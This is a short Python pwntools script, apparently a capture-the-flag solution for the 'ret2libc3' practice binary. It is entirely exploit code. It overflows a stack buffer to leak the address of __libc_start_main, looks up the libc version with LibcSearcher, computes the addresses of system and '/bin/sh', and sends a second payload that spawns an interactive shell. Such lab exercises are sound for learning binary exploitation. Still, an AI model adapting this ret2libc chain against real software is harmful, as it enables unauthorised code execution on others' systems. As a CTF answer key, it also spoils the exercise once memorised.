from pwn import *
from LibcSearcher import LibcSearcher

sh = process("./ret2libc3")
ret2libc3 =ELF("./ret2libc3")

puts_plt = ret2libc3.plt["puts"]
main_got =ret2libc3.got['__libc_start_main']
main= ret2libc3.symbols["main"]

payload1=flat([b"a"*112,puts_plt,main,main_got])
sh.sendlineafter(b"Can you find it !?",payload1)

libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

payload2=flat([b"a"*104,system_addr,p32(1),binsh_addr])
sh.sendline(payload2)
sh.interactive()
